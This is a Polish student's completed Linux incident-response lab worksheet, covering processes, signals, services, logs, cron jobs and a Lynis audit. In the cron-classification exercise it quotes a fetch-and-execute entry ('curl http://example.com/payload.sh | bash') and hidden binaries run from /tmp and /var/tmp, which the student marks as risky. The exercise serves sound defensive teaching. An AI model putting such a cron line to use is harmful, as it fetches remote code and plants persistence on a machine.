# Laboratorium 11 — polecenia do wykonania

## Zasady bezpieczeństwa

1. Wykonuj zadania modyfikujące system wyłącznie w maszynie laboratoryjnej.
2. Nie wykonuj ćwiczeń na komputerze służbowym, serwerze produkcyjnym ani systemie bez możliwości przywrócenia snapshotu.
3. Nie uruchamiaj kodu pobieranego z internetu.
4. Nie instaluj dodatkowych narzędzi bez zgody prowadzącego.
5. Nie kończ procesów systemowych ani procesów innych użytkowników.
6. Nie wyłączaj zdalnego dostępu, jeśli jest to jedyna metoda połączenia z maszyną.
7. Przed usunięciem procesu lub zadania zaplanowanego zbierz informacje potrzebne do analizy.

## Przygotowanie katalogu pracy

1. Przejdź do katalogu `content/11/lab`.
cd content/11/lab (ogolnie nie widze w materialach takiego katalogu)
bash: cd: content/11/lab: No such file or directory
Moj katalog z labem to:
cd lab11
2. Potwierdź bieżące położenie.
pwd
3. Wyświetl szczegółową zawartość katalogu, również pliki ukryte.
ls -la
vboxuser@Ubuntu:~/lab11$ ls -la
total 40
drwxrwx---  4 vboxuser vboxuser  4096 Sep 21 12:25 .
drwxr-x--- 23 vboxuser vboxuser  4096 Sep 21 11:36 ..
-rwxrwx---  1 vboxuser vboxuser 13623 Sep 21 12:20 README-commands.md
drwxrwxr-x  2 vboxuser vboxuser  4096 Sep 21 12:29 materials
-rwxrwx---  1 vboxuser vboxuser  2800 Sep 16 18:57 materials.zip
drwxrwx---  4 vboxuser vboxuser  4096 Sep 16 18:58 references
-rwxrwx---  1 vboxuser vboxuser  1759 Sep 16 18:57 references.zip

4. Utwórz katalog `work`.
mkdir work
5. Skopiuj `materials/incident-notes-template.md` do `work/incident-notes.md`.
cp -a materials/incident-notes-template.md work/incident-notes.md
6. Otwórz przygotowany plik w przeglądarce tekstowej.
less work/incident-notes.md

## 1. Rozpoznanie kontekstu systemu

1. Ustal nazwę hosta.
hostname
"Ubuntu"
2. Wyświetl pełne informacje o tożsamości i grupach bieżącego użytkownika.
id
"uid=1000(vboxuser) gid=1000(vboxuser) groups=1000(vboxuser),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),111(lpadmin),114(lxd),972(docker),973(vboxsf)"
3. Ustal nazwę bieżącego użytkownika.
whoami
"vboxuser"
4. Potwierdź bieżący katalog roboczy.
pwd
"/home/vboxuser/lab11"
5. Odczytaj aktualną datę i godzinę.
date
6. Sprawdź czas działania systemu oraz jego obciążenie.
uptime
"12:44:09 up  1:10,  1 user,  load average: 0.86, 0.70, 0.61"
7. Zanotuj nazwę hosta, użytkownika, grupy, aktualny czas i czas działania systemu.
Ubuntu
uid=1000(vboxuser)
gid=1000(vboxuser)
12:44:09
up  1:10
8. Potwierdź, że pracujesz na maszynie laboratoryjnej.
systemd-detect-virt
oracle
9. Sprawdź, czy bieżący użytkownik może uzyskiwać uprawnienia administracyjne.
sudo -l
[sudo: authenticate] Password:                 
User vboxuser may run the following commands on Ubuntu:
    (ALL : ALL) ALL
10. Ustal, czy system został uruchomiony niedawno, czy działa od dłuższego czasu.
12:48:50 up  1:15

## 2. Jednorazowy obraz procesów

1. Wyświetl wszystkie działające procesy w formacie zawierającym użytkownika, zużycie zasobów, stan, czas uruchomienia i pełne argumenty.
ps aux
2. Wyświetl wszystkie procesy w pełnym formacie systemowym wraz z identyfikatorami procesów nadrzędnych.
ps -ef
3. Utwórz własny widok zawierający: PID, PPID, użytkownika, stan, użycie CPU, użycie pamięci, dokładny czas uruchomienia i pełną linię polecenia.
ps -eo pid,ppid,user,stat,%cpu,%mem,lstart,cmd
4. Znajdź procesy działające jako `root`.
ps -U root -u root u
5. Znajdź procesy bieżącego użytkownika.
ps -u "$USER" -f
6. Wskaż procesy usługowe, na przykład działające jako `www-data`, `mysql`, `postgres` albo związane z usługą SSH.
ps -eo user,pid,ppid,stat,cmd | grep -E 'www-data|mysql|postgres|sshd'
"vboxuser   78634   68823 S+   grep --color=auto -E www-data|mysql|postgres|sshd"
7. Wskaż procesy wykorzystujące dużo CPU lub pamięci.
ps -eo pid,ppid,user,stat,%cpu,%mem,lstart,cmd --sort=-pcpu
8. Poszukaj procesów z nietypowymi argumentami.
ps -eo pid,ppid,user,lstart,args
9. Poszukaj procesów uruchomionych z katalogów tymczasowych.
ps -eo pid,ppid,user,args | grep -E '/tmp/|/var/tmp/|/dev/shm/'
7584    4975 vboxuser grep --color=auto -E /tmp/|/var/tmp/|/dev/shm/
10. Wybierz jeden proces wyglądający normalnie.
1210       1 root     Sun Sep 27 13:16:26 2026 /bin/sh /usr/lib/systemd/scripts/chronyd-starter.sh -n -F 1
11. Zapisz jego PID, PPID, użytkownika, stan, pełną linię uruchomienia oraz uzasadnienie oceny.
ps -p 1210 -o pid,ppid,user,stat,lstart,args
PID    PPID USER     STAT                  STARTED COMMAND
   1210       1 root     Ss   Sun Sep 27 13:16:26 2026 /bin/sh /usr/lib/systemd/scripts/chronyd-starter.sh -n -F 1
12. Wybierz jeden proces wymagający dalszej analizy, nawet jeśli nie jest złośliwy.
4334    2960 vboxuser SLl   1.5  3.5 Sun Sep 27 13:17:02 2026 /usr/share/code/code /home/vboxuser/lab11/README-commands.md
Wybralem ten proces poniewaz uzywa stosunkowo duzo zasobu CPU ale zapowiada sie normalnie poniewaz argumenty wskazuje, ze to Visual Studio Code, ktory ma otwarty wlasnie ten plik
13. Zapisz jego PID, PPID, użytkownika, pełną linię uruchomienia oraz element wymagający wyjaśnienia.
ps -p 4334 -o pid,ppid,user,stat,lstart,args
pid: 4334
ppid: 2960
user: vboxuser
start: /usr/share/code/code /home/vboxuser/lab11/README-commands.md

## 3. Obserwacja procesów na żywo

1. Uruchom interaktywny podgląd procesów dostępny standardowo w systemie.
top
zrodlo: manpages.ubuntu.com/manpages/stonking/man1/top.1.html
2. Sprawdź bieżące obciążenie CPU.
%Cpu(s):  4.7 us,  5.0 sy,  0.0 ni, 89.9 id,  0.0 wa,  0.0 hi,  0.4 si,  0.0 st 
3. Sprawdź wykorzystanie pamięci.
MiB Mem :   7405.6 total,   1537.9 free,   2459.2 used,   3799.6 buff/cache     
4. Zidentyfikuj najbardziej aktywne procesy.
   3286 vboxuser  20   0 4592172 440844 218020 S  25.6   5.8   2:42.24 gnome-shell                                                                                                                                                    
   4912 vboxuser  20   0 2393564 405200 162972 S  22.6   5.3   0:23.22 ptyxis                                                                                                                                                         
  12156 root      20   0       0      0      0 I   0.7   0.0   0:00.12 kworker/u13:0-events_freezable_pwr_efficient                                                                                                                   
     35 root      20   0       0      0      0 I   0.3   0.0   0:02.96 kworker/u14:0-events_unbound                                                                                                                                   
     78 root      20   0       0      0      0 I   0.3   0.0   0:01.81 kworker/u15:5-events_unbound                                                                                                                                   
   1540 root      20   0 1969900  46520  33068 S   0.3   0.6   0:02.74 containerd
5. Sprawdź użytkowników i czas działania tych procesów.
vboxuser, root, TIME+ 2:42.24, 0:23.22
6. Zamknij podgląd bez kończenia obserwowanych procesów.
q
7. Jeśli dostępny jest rozszerzony interaktywny monitor procesów, wykonaj w nim tę samą obserwację.
command -v htop
sudo snap install htop  # version 3.5.3
[sudo: authenticate] Password:                 
htop 3.5.3 from Maximiliano Bertacchini (maxiberta✪) installed
htop
8. Zanotuj proces wykorzystujący najwięcej CPU.
gnome-shell, PID 3328, user: vboxuser, circa 2.0%CPU
9. Zanotuj proces wykorzystujący najwięcej pamięci.
gnome-shell, circa 5.8%MEM
10. Oceń, czy wysoka aktywność ma oczywiste wyjaśnienie.
gnome-shell to element srodowiska graficznego Ubuntu i dziala pod uzytkownikiem vboxuser
11. Sprawdź, czy wskazany proces działa jako oczekiwany użytkownik.
tak, dziala na moim uzytkowniku: vboxuser

## 4. Relacje między procesami

1. Wyświetl drzewo procesów wraz z ich identyfikatorami.
pstree -p
2. Jeśli wynik jest długi, przejrzyj go stronicowo.
pstree -p | less
Potoki tzw. Pipelines zrodlo: www.gnu.org/software/bash/manual/html_node/Pipelines
3. Znajdź proces inicjalizujący system.
ps -p 1 -o pid,ppid,user,cmd
    PID    PPID USER     CMD
      1       0 root     /usr/lib/systemd/systemd --switched-root --system --deserialize=51
4. Znajdź powłoki użytkowników.
ps -eo pid,ppid,user,cmd | grep -E 'bash|zsh|fish'
   4975    4934 vboxuser /usr/bin/bash
  17676    4975 vboxuser grep --color=auto -E bash|zsh|fish
5. Znajdź procesy.
ps -p "PID"
6. Wskaż procesy potomne uruchomione przez bieżący terminal.
ps --ppid $$ -o pid,ppid,user,cmd
    PID    PPID USER     CMD
  18253    4975 vboxuser ps --ppid 4975 -o pid,ppid,user,cmd
7. W jednym terminalu uruchom bezpieczny proces oczekujący przez 300 sekund.
sleep 300
8. W drugim terminalu znajdź go na pełnej liście procesów.
ps -ef | grep sleep
vboxuser   18565    4975  0 14:14 pts/1    00:00:00 sleep 300
vboxuser   18687   18524  0 14:14 pts/0    00:00:00 grep --color=auto sleep
9. Znajdź ten sam proces w drzewie procesów.
pstree -p
           │               ├─ptyxis(4912)─┬─ptyxis-agent(4934)─┬─bash(4975)───sleep(18565)
           │               │              │                    ├─bash(18524)───pstree(18859)
10. Ustal jego proces nadrzędny.
ps -p 18565 -o pid,ppid,user,cmd
    PID    PPID USER     CMD
  18565    4975 vboxuser sleep 300
11. Po ćwiczeniu zakończ wyłącznie uruchomiony proces testowy.
kill 18565
12. Porównaj wygodę ustalania relacji w liście i drzewie procesów.
ps daje mozliwosc zobaczyc szczegoly danego procesu w kolumnach
pstree daje mozliwosc zobaczyc powiazania procesow miedzy soba
13. Wyjaśnij znaczenie PPID w analizie incydentu.
PPID, czyli Parent Process ID, w razie incydentu pozwala ustalic skad zostal, przez kogo uruchomiony proces

## 5. Sygnały i bezpieczne kończenie procesów

1. Uruchom bezpieczny proces testowy oczekujący przez 600 sekund.
sleep 600
2. W drugim terminalu znajdź jego PID.
ps -ef | grep sleep
vboxuser   24138    4975  0 14:39 pts/1    00:00:00 sleep 600
vboxuser   24156   18524  0 14:39 pts/0    00:00:00 grep --color=auto sleep
3. Wyślij mu domyślny sygnał łagodnego zakończenia.
kill 24138
4. Potwierdź, że zakończył działanie.
ps -p 24138
    PID TTY          TIME CMD
5. Ponownie uruchom proces oczekujący przez 600 sekund.
sleep 600
6. Znajdź jego PID.
ps -ef | grep sleep
vboxuser   24704    4975  0 14:42 pts/1    00:00:00 sleep 600
vboxuser   24736   18524  0 14:42 pts/0    00:00:00 grep --color=auto sleep
7. Zakończ go, tym razem jawnie wskazując sygnał pozwalający procesowi wykonać procedurę zamknięcia.
kill -TERM 24704
8. Nie używaj sygnału wymuszającego natychmiastowe zakończenie jako pierwszego wyboru.
Napierw -TERM, potem dopiero -KILL
9. Wyjaśnij różnicę między łagodnym a wymuszonym zakończeniem.
Lagodne zakonczenie daje sygnal zakonczenia sie normalnie, a wymuszenie stosuje sie jak pierwsze nie dziala i powoduje wymuszone zamkniecie
10. Wyjaśnij, dlaczego natychmiastowe zakończenie procesu może zniszczyć kontekst analityczny.
-TERM pozwala na kontrolowane zakonczenie i wykonanie zamkniecia zgodnie z poleceniami
-KILL wymusza natychmiast zakonczenie, wiec analizujac incydent bezpieczenstwa mozemy stracic wazne dane o dzialajacym procesie

## 6. Analiza usługi systemowej

1. Sprawdź szczegółowy stan usługi SSH.
systemctl status ssh
Unit ssh.service could not be found.
2. Jeżeli usługa SSH nie istnieje albo jest nieaktywna, zanotuj wynik.
Unit ssh.service could not be found.
3. Wyświetl wszystkie załadowane jednostki usługowe i wybierz inną dostępną usługę do dalszej analizy.
systemctl list-units --type=service
  cron.service                                          loaded active running Regular background program processing daemon
4. Sprawdź, czy wybrana usługa jest obecnie aktywna.
systemctl is-active ssh
inactive
systemctl is-active cron.service
active
5. Sprawdź, czy jest skonfigurowana do automatycznego uruchamiania.
systemctl is-enabled cron.service
enabled
6. Odczytaj jej główny PID.
systemctl status cron.service
Warning: The unit file, source configuration file or drop-ins of cron.service changed on disk. Run 'systemctl daemon-reload' to reload units.
● cron.service - Regular background program processing daemon
     Loaded: loaded (/usr/lib/systemd/system/cron.service; enabled; preset: enabled)
     Active: active (running) since Sun 2026-09-27 13:16:23 UTC; 1h 43min ago
 Invocation: 1894b3f1ce49404281613286b0486491
       Docs: man:cron(8)
   Main PID: 1235 (cron)
      Tasks: 1 (limit: 6343)
     Memory: 524K (peak: 2.6M)
        CPU: 86ms
     CGroup: /system.slice/cron.service
             └─1235 /usr/sbin/cron -f -P

Sep 27 13:17:04 Ubuntu CRON[4452]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
Sep 27 13:17:04 Ubuntu CRON[4449]: pam_unix(cron:session): session closed for user root
Sep 27 13:30:01 Ubuntu CRON[8372]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
Sep 27 13:30:01 Ubuntu CRON[8372]: pam_unix(cron:session): session closed for user root
Sep 27 14:17:01 Ubuntu CRON[19245]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
Sep 27 14:17:01 Ubuntu CRON[19247]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
Sep 27 14:17:01 Ubuntu CRON[19245]: pam_unix(cron:session): session closed for user root
Sep 27 14:30:02 Ubuntu CRON[22045]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)
Sep 27 14:30:02 Ubuntu CRON[22048]: (root) CMD (if [ -x /etc/init.d/anacron ] && ! [ -d /run/systemd/system ]; then exec /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)
Sep 27 14:30:02 Ubuntu CRON[22045]: pam_unix(cron:session): session closed for user root

Glowny PID: "Main PID: 1235 (cron)"

7. Sprawdź, czy szczegółowy widok zawiera ostatnie wpisy dziennika.
Tak, na koncu
8. Jeżeli prowadzący pozwala na zmianę stanu usługi w maszynie wirtualnej, zatrzymaj usługę SSH.
sudo systemctl stop ssh
[sudo: authenticate] Password:                 
Failed to stop ssh.service: Unit ssh.service not loaded.
9. Sprawdź jej stan po zatrzymaniu.
systemctl is-active ssh
inactive
10. Uruchom ją ponownie.
sudo systemctl start ssh
11. Sprawdź jej stan po uruchomieniu.
systemctl is-active ssh
12. Nie wyłączaj autostartu SSH, jeśli korzystasz ze zdalnego połączenia i nie masz alternatywnego dostępu.
Wylaczenie autostartu: sudo systemctl disable ssh
Wlaczenie autostrartu: sudo systemctl enable ssh

## 7. Logi usługi i systemu

1. Wyświetl 50 ostatnich wpisów dziennika usługi SSH.
journalctl -u ssh -n 50
-- No entries --

2. Wyświetl wpisy tej usługi z ostatnich dwóch godzin.
journalctl -u ssh --since "2 hours ago"
-- No entries --
3. Wyświetl wpisy całego systemu z ostatnich dwóch godzin.
journalctl --since "2 hours ago"
4. Uruchom obserwację nowych wpisów dziennika w czasie rzeczywistym.
sudo journalctl -f
5. W drugim terminalu wyczyść zapamiętane uwierzytelnienie administracyjne.
sudo -k
6. Spróbuj wyświetlić zawartość `/root` z uprawnieniami administracyjnymi.
sudo ls /root
[sudo: authenticate] Password:                 
snap  vboxpostinstall.sh
7. Jeśli ćwiczenie jest prowadzone interaktywnie, wprowadź jeden raz błędne hasło.
[sudo: authenticate] Password:                 
sudo: Authentication failed, try again.
8. Sprawdź, czy zdarzenie pojawiło się w obserwowanym dzienniku.
TAK:
"Sep 27 15:17:44 Ubuntu unix_chkpwd[32081]: password check failed for user (vboxuser)
Sep 27 15:17:44 Ubuntu sudo[32045]: pam_unix(sudo:auth): authentication failure; logname=vboxuser uid=1000 euid=0 tty=/dev/pts/0 ruser=vboxuser rhost=  user=vboxuser
"
9. Zakończ obserwację dziennika.
Ctrl+C
10. Porównaj informacje o usłudze z wpisami jej dziennika.
Informacja o usludze daje nam informacje czy jest uruchomiona, jej Mail PID, kilka ostatnich wpisach loga
Natomiast wpisy z jej dziennika pozwala na szczegolowa nalize historii zdarzen np. nieudane logowanie, udane logowanie
11. Wyjaśnij korzyść ograniczania wyników do określonego czasu.
Jak wiemy, ze cos zadzialo sie w okolicach danej godziny, dostajemy szybciej dane na ktorych analizie nam zalezy,
zmniejsza nam ilosc danych do obejrzenia, szybciej znajdziemy sekwencje zdarzen co przed, a co po
12. Oceń, czy pojedynczy błąd logowania wystarcza do potwierdzenia incydentu.
Jeden blad moze wynikac tylko po prostu ze wpisaniem blednego hasla - tylko pomylka.
Lepiej szukac wzorca, skorelowac to z innymi danymi, czy bylo wiecej prob, czy nazwa uzytkownika nie jest dziwna, czy uzytkownik nie ma niewlasciwych uprawnien

## 8. Klasyczne logi systemowe

1. Wyświetl szczegółową zawartość `/var/log` wraz z plikami ukrytymi i czytelnymi rozmiarami.
ls -lah /var/log
2. Sprawdź, czy istnieje `/var/log/auth.log`.
ls -l /var/log/auth.log
-rw-r----- 1 syslog adm 3316 Sep 27 15:30 /var/log/auth.log
3. Jeśli istnieje, wyświetl z uprawnieniami administracyjnymi jego 50 ostatnich wierszy.
sudo tail -n 50 /var/log/auth.log
4. Wyszukaj w nim bez rozróżniania wielkości liter nieudane zdarzenia.
sudo grep -i failed /var/log/auth.log
2026-09-27T15:17:44.958447+00:00 Ubuntu unix_chkpwd[32081]: password check failed for user (vboxuser)
2026-09-27T15:29:33.446742+00:00 Ubuntu dbus-daemon[1211]: [system] Failed to activate service 'org.bluez': timed out (service_start_timeout=25000ms)
2026-09-27T15:34:54.928732+00:00 Ubuntu sudo: vboxuser : TTY=/dev/pts/0 ; PWD=/home/vboxuser/lab11 ; USER=root ; COMMAND=/usr/bin/grep -i failed /var/log/auth.log

5. Wyszukaj w nim zdarzenia związane z użyciem uprawnień administracyjnych.
sudo grep -i sudo /var/log/auth.log
6. Jeśli plik nie istnieje, ponownie przejrzyj dostępne logi i użyj dziennika systemowego z ostatnich dwóch godzin.
journalctl --since "2 hours ago"
7. Znajdź w `/var/log` pliki logów, pliki z rozszerzeniem `.gz` oraz pliki zakończone `.1`.
sudo find /var/log -type f \( -name "*.log" -o -name "*.gz" -o -name "*.1" \)
8. Jeśli znajdziesz skompresowany log, otwórz go bez ręcznego rozpakowywania.
zless /var/log/kern.log.3.gz
9. Wyszukaj w skompresowanym logu nieudane zdarzenia bez rozróżniania wielkości liter.
zgrep -i failed /var/log/kern.log.3.gz
10. Ustal, czy badany system zapisuje logi do plików, dziennika systemowego, czy obu miejsc.
ls -lah /var/log
journalctl -n 20
Wniosek: Zapisuje do obydwu miejsc sa pliki .log jak i zapisy w dzienniku journalctl
11. Sprawdź, czy bieżący użytkownik może czytać analizowane logi.
ls -l /var/log/auth.log
-rw-r----- 1 syslog adm 4902 Sep 27 15:39 /var/log/auth.log
"-rw-"
12. Wyjaśnij, jakie dane wrażliwe mogą występować w logach.
Logi moga zawierac nazwy uzytkownikow, adresy IP, nazwy hosta, czasy logowania, nazwy procesow, uslug, polecenia.

## 9. Zadania cykliczne bieżącego użytkownika

1. Wyświetl zadania cykliczne bieżącego użytkownika.
crontab -l
no crontab for vboxuser
2. Jeśli użytkownik nie ma własnej tabeli zadań, zanotuj ten fakt jako prawidłowy stan.
no crontab for vboxuser
3. Otwórz tabelę zadań użytkownika do edycji.
crontab -e
4. Dodaj zadanie uruchamiane co pięć minut.
no crontab for vboxuser - using an empty one
Select an editor.  To change later, run select-editor again.
  1. /bin/nano        <---- easiest
  2. /usr/bin/vim.basic
  3. /usr/bin/vim.tiny
  4. /usr/bin/code
  5. /bin/ed

Choose 1-5 [1]: 1
crontab: installing new crontab
Za pomoca nano "*/5 * * * * /usr/bin/uptime >> /tmp/uptime.log 2>&1"
5. Skonfiguruj je tak, aby uruchamiało program `/usr/bin/uptime`.
/usr/bin/uptime
6. Przekieruj standardowy wynik i błędy do `/tmp/uptime.log`, dopisując kolejne wyniki.
>> /tmp/uptime.log 2>&1
7. Zapisz tabelę zadań.
Ctrl+O
klawisz Enter
Ctrl+X
8. Ponownie wyświetl zadania użytkownika i potwierdź obecność wpisu.
crontab -l
...
*/5 * * * * /usr/bin/uptime >> /tmp/uptime.log 2>&1

9. Poczekaj na wykonanie zadania albo uzgodnij z prowadzącym skrócenie czasu ćwiczenia.
cat /tmp/uptime.log lub tail /tmp/uptime.log - aby odczytac tylko ostatnie wpisy
10. Wyświetl zawartość `/tmp/uptime.log`.
cat /tmp/uptime.log lub tail /tmp/uptime.log - aby odczytac tylko ostatnie wpisy
 16:00:01 up  2:43,  1 user,  load average: 0.14, 0.17, 0.27
 16:05:01 up  2:48,  1 user,  load average: 0.09, 0.18, 0.25

11. Po zakończeniu ćwiczenia ponownie otwórz tabelę do edycji i usuń wyłącznie dodany wpis.
crontab -e
Usuniecie wpisu
Ctrl+O
klawisz Enter
Ctrl+X
12. Nie usuwaj całej tabeli zadań użytkownika.
Usuwam tylko wpis dodany wczesniej, uzywam tylko crontab -e, edytora nano, nie uzywam opcji crontab -r (ktora usunelaby tablice dla biezacego uzytkownika)

## 10. Systemowe zadania cykliczne i jednorazowe

1. Z uprawnieniami administracyjnymi wyświetl szczegółową zawartość `/etc/cron.d`.
sudo ls -lah /etc/cron.d
[sudo: authenticate] Password:                 
total 28K
drwxr-xr-x   2 root root 4.0K Apr 23 01:17 .
drwxr-xr-x 146 root root  12K Sep 24 13:06 ..
-rw-r--r--   1 root root  102 Nov  5  2025 .placeholder
-rw-r--r--   1 root root  224 Oct 31  2025 anacron
-rw-r--r--   1 root root  188 Feb 13  2026 e2scrub_all

2. W ten sam sposób wyświetl zawartość `/etc/cron.daily`.
sudo ls -lah /etc/cron.daily
total 44K
drwxr-xr-x   2 root root 4.0K Aug 10 14:22 .
drwxr-xr-x 146 root root  12K Sep 24 13:06 ..
-rw-r--r--   1 root root  102 Nov  5  2025 .placeholder
-rwxr-xr-x   1 root root  311 Oct 31  2025 0anacron
-rwxr-xr-x   1 root root  376 Apr 13 11:51 apport
-rwxr-xr-x   1 root root 1.5K Apr  7 09:02 apt-compat
-rwxr-xr-x   1 root root  123 Dec 16  2025 dpkg
-rwxr-xr-x   1 root root  377 Dec  6  2025 logrotate
-rwxr-xr-x   1 root root 1.4K May  2  2025 man-db

3. Wyświetl zawartość `/etc/cron.hourly`.
sudo ls -lah /etc/cron.hourly
total 20K
drwxr-xr-x   2 root root 4.0K Apr 23 01:15 .
drwxr-xr-x 146 root root  12K Sep 24 13:06 ..
-rw-r--r--   1 root root  102 Nov  5  2025 .placeholder

4. Sprawdź kolejkę zaplanowanych zadań jednorazowych.
atq
Wydaje sie, ze kolejka jest pusta
5. Jeżeli odpowiednie narzędzie nie jest dostępne albo jego usługa nie działa, zanotuj to jako cechę środowiska.
Potwierdzam dostepnosc narzedzia:
command -v atq
/usr/bin/atq
6. Porównaj zadania systemowe z tabelą zadań bieżącego użytkownika.
crontab -l pokazuje zadania cykliczne biezacego uzytkownika
/etc/cron.d, cron.daily oraz cron.hourly zawieraja zaplanowane zadania dla systemu
7. Poszukaj plików, których nazwy lub czasy modyfikacji wymagają wyjaśnienia.
sudo ls -laht /etc/cron.d
sudo ls -laht /etc/cron.daily
sudo ls -laht /etc/cron.hourly
8. Wyjaśnij, dlaczego zadania jednorazowe są istotne w analizie incydentu.
Zadanie jednorazowe moga zawierac polecenia zaplanowane do wykonania w przyszlosci. Nie widac ich jeszcze teraz w dzialajacych procesach. Trzeba sprawdzic czy w kolejce
nie mamy czegos wymagajacego dzialania/analizy

## 11. Analiza wzorców podejrzanych zadań

1. Otwórz `materials/cron-examples.md` w przeglądarce tekstowej.
less materials/cron-examples.md
2. Dla każdego przykładu oceń, czy wpis jest normalny, podejrzany czy wysokiego ryzyka.
```cron
*/5 * * * * /usr/bin/uptime >> /tmp/uptime.log 2>&1
```
OCENA: normalny

```cron
0 2 * * * /usr/local/bin/backup-app >> /var/log/backup-app.log 2>&1
```
OCENA: normalny

```cron
* * * * * curl http://example.com/payload.sh | bash
```
OCENA: wysokie ryzyko (nie uruchamiamy)

```cron
*/2 * * * * /tmp/.cache/update
```
OCENA: podejrzany

```cron
0 * * * * backup-app >> backup.log 2>&1
```
OCENA: podejrzany

```cron
@reboot /var/tmp/.agent
```
OCENA: podejrzany 

3. Ustal, który użytkownik uruchamia zadanie.
Nie zawieraja pola z nazwa uzytkownika
4. Ustal częstotliwość jego wykonywania.
Ad. 1 - co 5 minut
Ad. 2 - codziennie o 2:00
Ad. 3 - co minute
Ad. 4 - co 2 minuty
Ad. 5 - o pelnej godzinie co godzine
Ad. 6 - przy uruchamianiu systemu
5. Sprawdź, czy wpis używa pełnych ścieżek.
Ad. 1 - tak
Ad. 2 - tak
Ad. 3 - nie
Ad. 4 - tak
Ad. 5 - nie
Ad. 6 - tak
6. Sprawdź, czy pobiera kod z zewnętrznego źródła.
Przyklad numer 3 ''' cron
curl https://example.com/payload.sh | bash - pobiera kod z zewnatrz
7. Ustal, gdzie trafiają standardowy wynik i błędy.
Ad. 1 stout i stderr trafiaja do /tmp/uptime.log
Ad. 2 do /var/log/backup-app.log
Ad. 3 brak
Ad. 4 brak
Ad. 5 do pliku backup.log i nieznanej lokalizacji
Ad. 6 brak
8. Zapisz, co należy sprawdzić przed usunięciem wpisu.
- wlasciciela crontaba i uzytkownika dla ktorego zadanie sie wykona
- uprawnienia uruchamianego pliku
- pelna sciezke i zawartosc skryptu/zawartosci
- powiazane procesy
- logi
- powiazania z jakimi aplikacjami i innymi
9. Nie wykonuj przykładów ocenionych jako wysokiego ryzyka.
Dla przykladu "curl http://example.com/payload.sh | bash" - nie uruchamiamy
Podobnie innych zanim ich dokladnie nie sprawdzimy

## 12. Mini-scenariusz SOC

1. Ponownie skopiuj `materials/incident-notes-template.md` do `work/incident-notes.md`.
cp -a materials/incident-notes-template.md work/incident-notes.md
2. Zapisz aktualną datę i godzinę.
date
Sun Sep 27 04:50:46 PM UTC 2026
3. Ustal nazwę hosta.
hostname
Ubuntu
4. Zapisz tożsamość i grupy bieżącego użytkownika.
id
uid=1000(vboxuser) gid=1000(vboxuser) groups=1000(vboxuser),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),111(lpadmin),114(lxd),972(docker),973(vboxsf)

5. Zbierz listę procesów zawierającą PID, PPID, użytkownika, stan, użycie CPU i pamięci, czas uruchomienia oraz pełną linię polecenia.
ps -eo pid,ppid,user,stat,%cpu,%mem,lstart,cmd
6. Zbierz drzewo procesów wraz z identyfikatorami.
pstree -p
7. Wyświetl wszystkie załadowane jednostki usługowe.
systemctl list-units --type=service
8. Zbierz wpisy dziennika systemowego z ostatniej godziny.
journalctl --since "1 hour ago"
9. Wyświetl szczegółową zawartość `/var/log`.
ls -lah /var/log
10. Sprawdź zadania cykliczne bieżącego użytkownika.
crontab -l
11. Z uprawnieniami administracyjnymi wyświetl szczegółową zawartość `/etc/cron.d`.
sudo ls -lah /etc/cron.d
[sudo: authenticate] Password:                 
total 28K
drwxr-xr-x   2 root root 4.0K Apr 23 01:17 .
drwxr-xr-x 146 root root  12K Sep 24 13:06 ..
-rw-r--r--   1 root root  102 Nov  5  2025 .placeholder
-rw-r--r--   1 root root  224 Oct 31  2025 anacron
-rw-r--r--   1 root root  188 Feb 13  2026 e2scrub_all

12. Sprawdź kolejkę zadań jednorazowych.
atq
Wynik nic nie zwraca - jest pusty
13. W notatce zapisz trzy fakty o systemie.
a) Nazwa hosta to Ubuntu. Biezacy uzytkownik to vboxuser (UID 1000)
nalezy do grup sudo, docker i vboxsf
b) W systemie aktywne sa uslugi cron, docker, systemd-journald
c) System dziala jako maszyna wirtualana VirtualBoX. Logi to potwierdzaja
14. Zapisz jedną hipotezę i wyraźnie oznacz ją jako hipotezę.
Wpis z logow:
watchdog: BUG: soft lockup - CPU#0 stuck for 21s!
a nastepnie komunikaty rtkit-daemon o watku canary
Hipoteza:
Dochodzi do chwilowego problemu z dostepem do czasu procesora. Nie moge odnalezc pewnej przyczyny. Nie uznaje tego za incydent bezpieczenstwa.
15. Zapisz jedno zdarzenie znalezione w logach.
Kolejne zdarzenie z logow:
Sep 27 16:05:01 Ubunru CRON[42020]:
(vboxuser) CMD (/usr/bin/uptime >> /tmp/uptime.log 2>$1)
16. Zapisz jedno zadanie cykliczne albo informację, że takiego zadania nie ma.
W chciwli wykonywania nalizy uzytkownik vboxuser nie posiadal aktywnych zadan w crontable biezacego uzytkownika.
Polcenie crontab -1 wyswietlilo komentarze konfiguracyjne ale nie mialo zadnych aktywnych wpisow
17. Zapisz jedną rzecz wymagającą dalszej analizy.
Wykryto:
watchdog: BUG: soft lockup - CPU#0 stuck for 21s!
- zdarzenie wystapilo 27.09.2026 o 16:06:19 i bylo powiazane z komunikatami rtkit-daemon o problemach z dostepem do przydzielonych watkow CPU.
Nalezy sprawdzic obciazenie maszyny wirtualnej w tym czasie i ustalic, czy to bylo jednorazowe obciazenie maszyny wirtualnej, czy wystepuje =cyklicznie.

## 13. Audyt systemu

1. Sprawdź, czy narzędzie Lynis jest zainstalowane (jeśli nie zainstaluj "sudo apt install lynis").
command -v lynis
lynis --version
sudo apt install lynis
2. Jeśli jest dostępne i prowadzący pozwala na jego użycie, uruchom pełny audyt systemu z uprawnieniami administracyjnymi.
zrodlo: cisofy.com/documentation/lynis/
sudo lynis audit system
3. Wybierz jedno ostrzeżenie z raportu.
  Warnings (1):
  ----------------------------
  ! Found one or more vulnerable packages. [PKGS-7392] 
      https://cisofy.com/lynis/controls/PKGS-7392/

4. Zweryfikuj je innym źródłem danych przed uznaniem za problem.
vboxuser@Ubuntu:/$ sudo apt update
[sudo: authenticate] Password:                 
Hit:1 http://pl.archive.ubuntu.com/ubuntu resolute InRelease
Hit:2 http://pl.archive.ubuntu.com/ubuntu resolute-updates InRelease                                                             
Hit:3 https://packages.microsoft.com/repos/code stable InRelease                                                                 
Hit:4 http://pl.archive.ubuntu.com/ubuntu resolute-backports InRelease
Hit:5 http://security.ubuntu.com/ubuntu resolute-security InRelease
Hit:6 https://download.docker.com/linux/ubuntu resolute InRelease
